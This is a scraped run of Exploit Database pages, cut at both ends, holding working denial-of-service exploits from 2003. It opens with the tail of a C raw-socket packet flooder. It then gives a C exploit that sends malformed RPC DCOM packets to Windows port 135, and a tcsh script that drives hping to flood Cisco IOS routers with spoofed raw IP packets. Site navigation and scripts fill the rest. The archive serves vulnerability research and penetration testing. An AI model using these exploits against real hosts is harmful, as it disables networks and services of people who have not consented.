SOCK_RAW, IPPROTO_RAW)) == -1) {fprintf(stderr, "Error: Cannot open raw socket.\n");return(EXIT_FAILURE);}/* Build the IPv4 header */ipv4_hdr.ipvhl = ((4 << 4) | 0x0f) & (5 | 0xf0); /* :) */ipv4_hdr.type_service = 0x10;#ifdef OSTYPE_BSDipv4_hdr.packet_len = 0x14 + len;ipv4_hdr.fragment = 0x4000;#elseipv4_hdr.packet_len = htons(0x14 + len);ipv4_hdr.fragment = htons(0x4000);#endifipv4_hdr.time_live = hops;ipv4_hdr.src_ip.s_addr = src_ip;ipv4_hdr.dst_ip.s_addr = dst_ip;while(n < count) {/* Seed the random generator */if(gettimeofday(&seed, NULL) == -1) {fprintf(stderr, "Error: Cannot seed the random generator.\n");return(EXIT_FAILURE);}srandom((unsigned int) (seed.tv_sec ^ seed.tv_usec));ipv4_hdr.protocol = proto[random() % 0x4];#ifdef DEBUGprintf("DEBUG: Protocol: %i\n", ipv4_hdr.protocol);#endifipv4_hdr.ident = htons(random() % 0x7fff);/* Calculate checksum */ipv4_hdr.sum = 0x0000;ipv4_hdr.sum = in_cksum((unsigned short *) &ipv4_hdr, 0x14 + len, 0);#ifdef DEBUGprintf("DEBUG: Checksum: %i\n", ipv4_hdr.sum);#endifbuf = malloc(0x14 + len);memset(buf, '\0', 0x14 + len);memcpy((unsigned char *) buf, (unsigned char *) &ipv4_hdr,0x14 + len);#ifdef DEBUGprintf("DEBUG: ");for(i=0; i < 0x14 + len; i++)printf(" %02x", buf[i]);printf("\n");#endifmemset(&sin, '\0', sizeof(struct sockaddr_in));sin.sin_family = AF_INET;sin.sin_addr.s_addr = dst_ip;bytes = sendto(fd, buf, 0x14 + len, 0, (struct sockaddr *) &sin,sizeof(struct sockaddr));#ifdef DEBUGprintf("DEBUG: Wrote %i bytes.\n", bytes);#endifif(loop != 1) n++;free(buf);}close(fd);return(EXIT_SUCCESS);}int in_cksum(unsigned short *addr, int len, int csum) {register int sum = csum;unsigned short answer = 0;register unsigned short *w = addr;register int nleft = len;/** Our algorithm is simple, using a 32 bit accumulator (sum), we add* sequential 16 bit words to it, and at the end, fold back all the* carry bits from the top 16 bits into the lower 16 bits.*/while (nleft > 1) {sum += *w++;nleft -= 2;}/* mop up an odd byte, if necessary */if (nleft == 1) {sum += htons(*(unsigned char *)w<<8);}/* add back carry outs from top 16 bits to low 16 bits */sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */sum += (sum >> 16); /* add carry */answer = ~sum; /* truncate to 16 bits */return(answer);}// milw0rm.com [2003-07-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 61
Microsoft Windows Server 2000 - RPC DCOM Interface Denial of Service - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows Server 2000 - RPC DCOM Interface Denial of ServiceEDB-ID:61CVE:2003-0605EDB Verified:Author:FlashskyType:dosExploit:/Platform:WindowsDate:2003-07-21Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED// This is a new unpatched vulnerability - NOT the MS03-026#include <winsock2.h>#include <stdio.h>#include <windows.h>#include <process.h>#include <string.h>#include <winbase.h>unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xA0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x13,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x01,0x00,0x03,0x00,0x05,0x00,0x06,0x01,0x00,0x00,0x00,0x00,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x31,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};void main(int argc,char ** argv){WSADATA WSAData;int i;SOCKET sock;SOCKADDR_IN addr_in;short port=135;unsigned char buf1[0x1000];printf("RPC DCOM DOS Vulnerability discoveried by Xfocus.org\n");printf("Code by FlashSky,Flashsky xfocus org,benjurry,benjurry xfocus org\n");printf("Welcome to http://www.xfocus.net\n");if(argc<2){printf("useage:%s target\n",argv[0]);exit(1);}if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0){printf("WSAStartup error.Error:%d\n",WSAGetLastError());return;}addr_in.sin_family=AF_INET;addr_in.sin_port=htons(port);addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET){printf("Socket failed.Error:%d\n",WSAGetLastError());return;}if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR){printf("Connect failed.Error:%d",WSAGetLastError());return;}if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR){printf("Send failed.Error:%d\n",WSAGetLastError());return;}i=recv(sock,buf1,1024,MSG_PEEK);if (send(sock,request,sizeof(request),0)==SOCKET_ERROR){printf("Send failed.Error:%d\n",WSAGetLastError());return;}i=recv(sock,buf1,1024,MSG_PEEK);}// milw0rm.com [2003-07-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPort142122232542495366697079808110210511011111311912313513914316116216438338940240641144344444544650250451351451553254855455561762363165568978378780887388890199810001040108910991100111411201194123514711521153315811589160416171723174317611812185818611900194720002022204921002103212121252181224223152375238023812401248025252640281028122947295429903000303030503052312831293181320032173306333333783389346034653500353536323690379038143817400040024070408141054111432243434434450145554592466147504848500050605061508050815093515151805247525052725308543254665554555556005655566658005803581458585900598460666070608060826101611261296379650265036660666770017002707070717080710071447210727272907426744375107547764977707777777877877879790280008001800280048008802080228023802880308080808180828088809081818300840084438445847385008585861988008812883988808888900090019002908090909091910091249200925192569443944797849788985598769900998799939999100001000110080102021020310443106161100011211114601220312221123451239712401133271370113722138381699218821188811900019810198132000020010200312011120171220032342325672260002701527700280153000030303313373240032674327643420537215377773784838292400074152344334468244808049152500005049652311527895286952986534135434554890555545555556380577725808062514TagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 62
Cisco IOS - using hping Remote Denial of Service - Hardware dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDCisco IOS - using hping Remote Denial of ServiceEDB-ID:62CVE:2003-0567EDB Verified:Author:zerashType:dosExploit:/Platform:HardwareDate:2003-07-22Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED#!/bin/tcsh -f## Remote DoS exploit against the recent Cisco IOS vuln. Cisco doc. 44020# Vulnerable versions - all Cisco devices running IOS.# Requirements : tcsh, and hping.# Get hping @ www.hping.org## And you know the best part? This script actually works! Unlike the few .c's# floating around the net. Uses swipe for the protocol bit. Also, need to be uid=0,# OR +s ciscodos.sh because of hping opening raw sockets.## Example :## root@evicted # ping 192.168.1.1# PING 192.168.1.1 (192.168.1.1): 56 data bytes# 64 bytes from 192.168.1.1: icmp_seq=0 ttl=150 time=1.287 ms# 64 bytes from 192.168.1.1: icmp_seq=1 ttl=150 time=0.817 ms# --- 192.168.1.1 ping statistics ---# 2 packets transmitted, 2 packets received, 0% packet loss# round-trip min/avg/max/std-dev = 0.817/1.052/1.287/0.235 ms## root@evicted # ./ciscodos.sh 192.168.1.1 0# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes# --- 192.168.1.1 hping statistic ---# 19 packets tramitted, 0 packets received, 100% packet loss# round-trip min/avg/max = 0.0/0.0/0.0 ms# HPING 192.168.1.1 (dc0 192.168.1.1): raw IP mode set, 20 headers + 26 data bytes# --- 192.168.1.1 hping statistic ---# 19 packets tramitted, 0 packets received, 100% packet loss# round-trip min/avg/max = 0.0/0.0/0.0 ms# -------------SNIP---------------# root@evicted # ping 192.168.1.1# PING 192.168.1.1 (192.168.1.1): 56 data bytes# --- 192.168.1.1 ping statistics ---# 2 packets transmitted, 0 packets received, 100% packet loss# -------------SNIP---------------## Coded by zerash@evicted.org#if ($1 == "" || $2 == "") thenecho "usage: $0 <router hostname|address> <ttl>"exitendifforeach protocol (53)/usr/local/sbin/hping $1 --rawip --rand-source --ttl $2 --ipproto $protocol --count 76 --interval u250 --data 26end# milw0rm.com [2003-07-22]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if 